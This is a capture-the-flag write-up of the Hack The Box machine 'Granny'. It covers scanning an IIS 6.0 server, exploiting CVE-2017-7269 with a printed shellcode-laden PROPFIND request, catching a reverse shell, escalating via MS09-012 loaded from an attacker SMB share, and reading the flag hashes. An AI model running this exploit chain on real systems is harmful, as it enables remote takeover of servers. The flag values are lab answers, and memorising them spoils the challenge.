# Granny
>Author : Xyan1d3
>Date : 28th June 2021
>IP : 10.10.10.15
>OS : Windows
>Difficulty : Easy
# Initial Enumeration
## Nmap
```sql
# Nmap 7.91 scan initiated Tue Jun 29 00:39:02 2021 as: nmap -sC -sV -v -oN nmap/granny 10.10.10.15
Nmap scan report for granny.htb (10.10.10.15)
Host is up (0.075s latency).
Not shown: 999 filtered ports
PORT   STATE SERVICE VERSION
80/tcp open  http    Microsoft IIS httpd 6.0
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD DELETE COPY MOVE PROPFIND PROPPATCH SEARCH MKCOL LOCK UNLOCK PUT POST
|_  Potentially risky methods: TRACE DELETE COPY MOVE PROPFIND PROPPATCH SEARCH MKCOL LOCK UNLOCK PUT
|_http-server-header: Microsoft-IIS/6.0
|_http-title: Under Construction
| http-webdav-scan: 
|   Public Options: OPTIONS, TRACE, GET, HEAD, DELETE, PUT, POST, COPY, MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK, SEARCH
|   Allowed Methods: OPTIONS, TRACE, GET, HEAD, DELETE, COPY, MOVE, PROPFIND, PROPPATCH, SEARCH, MKCOL, LOCK, UNLOCK
|   Server Date: Mon, 28 Jun 2021 19:09:19 GMT
|   WebDAV type: Unknown
|_  Server Type: Microsoft-IIS/6.0
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

# Initial FootHold
We look for any possible exploits on the `IIS 6.0` running here.

We search for some possible exploits and find out that the IIS Webserver is vulnerable to `CVE-2017-7269` attack which is a Buffer Overflow on the WebDav protocol and allows URCE.

Exploit Link : https://raw.githubusercontent.com/g0rx/iis6-exploit-2017-CVE-2017-7269/master/iis6%20reverse%20shell

Running the Exploit.
```python
┌─[Magisk@Xyan1d3]─[10.10.14.11]─[~/htb/granny]
└──╼ # python2 exploit.py 10.10.10.15 80 10.10.14.11 8888
PROPFIND / HTTP/1.1
Host: localhost
Content-Length: 1744
If: <http://localhost/aaaaaaa潨硣睡焳椶䝲稹䭷佰畓穏䡨噣浔桅㥓偬啧杣㍤䘰硅楒吱䱘橑牁䈱瀵塐㙤汇㔹呪倴呃睒偡㈲测水㉇扁㝍兡塢䝳剐㙰畄桪㍴乊硫䥶乳䱪坺潱塊㈰㝮䭉前䡣潌畖畵景癨䑍偰稶手敗畐橲穫睢癘扈攱ご汹偊呢倳㕷橷䅄㌴摶䵆噔䝬敃瘲牸坩䌸扲娰夸呈ȂȂዀ栃汄剖䬷汭佘塚祐䥪塏䩒䅐晍Ꮐ栃䠴攱潃湦瑁䍬Ꮐ栃千橁灒㌰塦䉌灋捆关祁穐䩬> (Not <locktoken:write1>) <http://localhost/bbbbbbb祈慵佃潧歯䡅㙆杵䐳㡱坥婢吵噡楒橓兗㡎奈捕䥱䍤摲㑨䝘煹㍫歕浈偏穆㑱潔瑃奖潯獁㑗慨穲㝅䵉坎呈䰸㙺㕲扦湃䡭㕈慷䵚慴䄳䍥割浩㙱乤渹捓此兆估硯牓材䕓穣焹体䑖
漶獹桷穖慊㥅㘹氹䔱㑲卥塊䑎穄氵婖扁湲昱奙吳ㅂ塥奁煐〶坷䑗卡Ꮐ栃湏栀湏栀䉇癪Ꮐ栃䉗佴奇刴䭦䭂瑤硯悂栁儵牺瑺䵇䑙块넓栀ㅶ湯ⓣ栁ᑠ栃̀翾￿￿Ꮐ栃Ѯ栃煮瑰ᐴ栃⧧栁鎑栀㤱普䥕げ呫癫牊祡ᐜ栃清栀眲票䵩㙬䑨䵰艆栀䡷㉓ᶪ栂潪䌵ᏸ栃⧧栁VVYA4444444444QATAXAZAPA3QADAZABARALAYAIAQAIAQAPA5AAAPAZ1AI1AIAIAJ11AIAIAXA58AAPAZABABQI1AIQIAIQI1111AIAJQI1AYAZBABABABAB30APB944JBRDDKLMN8KPM0KP4KOYM4CQJINDKSKPKPTKKQTKT0D8TKQ8RTJKKX1OTKIGJSW4R0KOIBJHKCKOKOKOF0V04PF0M0A>
```

Getting a reverse shell back as the user `NT Authority/Network Service`.
```python
┌─[Magisk@Xyan1d3]─[10.10.14.11]─[~/htb/granny]
└──╼ # nc -lvnp 8888
Listening on 0.0.0.0 8888
Connection received on 10.10.10.15 1035
Microsoft Windows [Version 5.2.3790]
(C) Copyright 1985-2003 Microsoft Corp.

c:\windows\system32\inetsrv>whoami
whoami
nt authority\network service
```

![[Pasted image 20210629010935.png]]

# Root Escalation
For, Root Escalation We need to know the exact OS version. For, This we do a simple `systeminfo` command and get the output.
```python
C:\Documents and Settings>systeminfo
systeminfo

Host Name:                 GRANNY
OS Name:                   Microsoft(R) Windows(R) Server 2003, Standard Edition
OS Version:                5.2.3790 Service Pack 2 Build 3790
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Standalone Server
OS Build Type:             Uniprocessor Free
Registered Owner:          HTB
Registered Organization:   HTB
Product ID:                69712-296-0024942-44782
Original Install Date:     4/12/2017, 5:07:40 PM
System Up Time:            0 Days, 0 Hours, 12 Minutes, 50 Seconds
System Manufacturer:       VMware, Inc.
System Model:              VMware Virtual Platform
System Type:               X86-based PC
```

Here, We will be exploiting `MS09-012` inorder to get a escalated to `NT Authority/System`.
Exploit Link : https://github.com/SecWiki/windows-kernel-exploits/blob/master/MS09-012/pr.exe

We can issue this run this exploit with a single command to be run as an elevated privileges by this exploit.

```python
c:\windows\system32\inetsrv>\\10.10.14.11\magisk\pr.exe whoami
\\10.10.14.11\magisk\pr.exe whoami
/xxoo/-->Build&&Change By p 
/xxoo/-->This exploit gives you a Local System shell 
/xxoo/-->Got WMI process Pid: 1824 
begin to try
/xxoo/-->Found token SYSTEM 
/xxoo/-->Command:whoami
nt authority\system      <------ Privilege Escalated
```

We could now chain this exploit with `nc64.exe` to also get a shell as the elevated user.
![[Pasted image 20210629020755.png]]
We get a shell as `NT Authority/SYSTEM`.
![[Pasted image 20210629020834.png]]

**The shell we recieve is fragile as it dies within 30-40seconds.**


## Getting User Flag
We get our user flag by visiting the `C:\Documents and Settings\Lakis\Desktop` directory.
```python
C:\Documents and Settings>cd Lakis\Desktop
cd Lakis\Desktop

C:\Documents and Settings\Lakis\Desktop>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 246C-D7FE

 Directory of C:\Documents and Settings\Lakis\Desktop

04/12/2017  10:19 PM    <DIR>          .
04/12/2017  10:19 PM    <DIR>          ..
04/12/2017  10:20 PM                32 user.txt
               1 File(s)             32 bytes
               2 Dir(s)  18,092,875,776 bytes free

C:\Documents and Settings\Lakis\Desktop>type user.txt
type user.txt
700c5dc163014e22b3e408f8703f67d1
```

## Getting Root Flag
We get our user flag by visiting the `C:\Documents and Settings\Administrator\Desktop` directory.
```python
C:\>cd Documents and Settings\Administrator\Desktop
cd Documents and Settings\Administrator\Desktop

C:\Documents and Settings\Administrator\Desktop>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 246C-D7FE

 Directory of C:\Documents and Settings\Administrator\Desktop

04/12/2017  05:28 PM    <DIR>          .
04/12/2017  05:28 PM    <DIR>          ..
04/12/2017  10:17 PM                32 root.txt
               1 File(s)             32 bytes
               2 Dir(s)  18,092,871,680 bytes free

C:\Documents and Settings\Administrator\Desktop>type root.txt
type root.txt
aa4beed1c0584445ab463a6747bd06e9
```